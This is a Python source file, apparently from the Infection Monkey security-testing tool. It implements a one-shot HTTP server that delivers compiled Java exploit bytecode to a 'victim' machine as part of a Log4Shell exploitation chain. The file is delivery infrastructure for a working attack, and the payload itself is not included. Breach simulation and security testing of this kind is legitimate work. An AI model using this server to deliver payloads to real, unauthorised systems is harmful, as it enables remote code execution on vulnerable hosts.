import http.server
import logging
import threading
from typing import Type

from infection_monkey.utils.threading import create_daemon_thread

logger = logging.getLogger(__name__)

HTTP_TOO_MANY_REQUESTS_ERROR_CODE = 429


class ExploitClassHTTPServer:
    """
    An HTTP server that serves Java bytecode for use with the Log4Shell exploiter. This server
    limits the number of requests to one. That is, after one victim has downloaded the java
    bytecode, the server will respond with a 429 error to all future requests.

    Note: There can only be one instance of this class at a time due to the way it is implemented.
    """

    def __init__(self, ip: str, port: int, java_class: bytes, poll_interval: float = 0.5):
        """
        :param ip: The IP address that the server will bind to
        :param port: The port that the server will listen on
        :param java_class: The compiled Java bytecode that the server will serve
        :param poll_interval: Poll for shutdown every `poll_interval` seconds, defaults to 0.5.
        """
        logger.debug(f"The Java Exploit class will be served at {ip}:{port}")

        self._class_downloaded = threading.Event()
        self._poll_interval = poll_interval

        HTTPHandler = _get_new_http_handler_class(java_class, self._class_downloaded)

        self._server = http.server.HTTPServer((ip, port), HTTPHandler)
        self._server_thread = create_daemon_thread(
            target=self._server.serve_forever,
            name="ExploitClassHTTPServerThread",
            args=(self._poll_interval,),
        )

    def run(self):
        """
        Runs the HTTP server in the background and blocks until the server has started.
        """
        logger.info("Starting ExploitClassHTTPServer")
        self._class_downloaded.clear()

        # NOTE: Unlike in LDAPExploitServer, we theoretically don't need to worry about a race
        # between when `serve_forever()` is ready to handle requests and when the victim machine
        # sends its requests. This could change if we switch from multithreading to multiprocessing.
        # See
        # https://stackoverflow.com/questions/22606480/how-can-i-test-if-python-http-server-httpserver-is-serving-forever
        # for more information.
        self._server_thread.start()

    def stop(self, timeout: float = None):
        """
        Stops the HTTP server.

        :param timeout: A floating point number of seconds to wait for the server to stop. If this
                        argument is None (the default), the method blocks until the HTTP server
                        terminates. If `timeout` is a positive floating point number, this method
                        blocks for at most `timeout` seconds.
        """
        if self._server_thread.is_alive():
            logger.debug("Stopping the Java Exploit class HTTP server")
            self._server.shutdown()
            self._server_thread.join(timeout)

        if self._server_thread.is_alive():
            logger.warning("Timed out while waiting for The HTTP exploit server to stop")
        else:
            logger.debug("The Java Exploit class HTTP server has stopped")

    def exploit_class_downloaded(self) -> bool:
        """
        Returns whether or not a victim has downloaded the Java bytecode from the server.

        :return: True if the victim has downloaded the Java bytecode from the server. False
                 otherwise.
        :rtype: bool
        """
        return self._class_downloaded.is_set()


def _get_new_http_handler_class(
    java_class: bytes, class_downloaded: threading.Event
) -> Type[http.server.BaseHTTPRequestHandler]:
    """
    Dynamically create a new subclass of http.server.BaseHTTPRequestHandler and return it to the
    caller.

    Because Python's http.server.HTTPServer accepts a class and creates a new object to
    handle each request it receives, any state that needs to be shared between requests must be
    stored as class variables. Creating the request handler classes dynamically at runtime allows
    multiple ExploitClassHTTPServers, each with it's own unique state, to run concurrently.
    """

    def do_GET(self):
        with self.download_lock:
            if self.class_downloaded.is_set():
                self.send_error(
                    HTTP_TOO_MANY_REQUESTS_ERROR_CODE,
                    "Java exploit class has already been downloaded",
                )
                return

            self.class_downloaded.set()

        logger.info("Java class server received a GET request!")
        self.send_response(200)
        self.send_header("Content-type", "application/octet-stream")
        self.end_headers()
        logger.info("Sending the payload class!")
        self.wfile.write(self.java_class)

    return type(
        "HTTPHandler",
        (http.server.BaseHTTPRequestHandler,),
        {
            "java_class": java_class,
            "class_downloaded": class_downloaded,
            "download_lock": threading.Lock(),
            "do_GET": do_GET,
        },
    )
